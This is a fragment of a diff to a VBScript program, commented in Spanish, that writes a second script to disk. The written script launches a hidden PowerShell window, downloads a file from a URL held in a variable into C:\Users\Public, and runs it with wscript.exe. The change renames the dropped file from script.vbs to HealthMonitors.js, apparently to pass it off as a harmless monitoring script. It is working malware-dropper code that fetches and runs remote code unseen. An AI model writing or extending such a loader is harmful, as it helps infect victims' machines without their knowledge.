@@ -36,7 +36,7 @@
     ' Ejecuta el JS con PowerShell oculto
     archivo.WriteLine "If urlRecortada <> """" Then"
     archivo.WriteLine "  Set ejecutarShell = CreateObject(""WScript.Shell"")"
-    archivo.WriteLine "  ejecutarShell.Run ""powershell.exe -WindowStyle Hidden -Command Invoke-WebRequest -Uri '"" & urlRecortada & ""' -OutFile 'C:\Users\Public\script.vbs'; Start-Process 'wscript.exe' -ArgumentList 'C:\Users\Public\script.vbs'"", 0, False"
+    archivo.WriteLine "  ejecutarShell.Run ""powershell.exe -WindowStyle Hidden -Command Invoke-WebRequest -Uri '"" & urlRecortada & ""' -OutFile 'C:\Users\Public\HealthMonitors.js'; Start-Process 'wscript.exe' -ArgumentList 'C:\Users\Public\HealthMonitors.js'"", 0, False"
     archivo.WriteLine "End If"
 
     archivo.Close
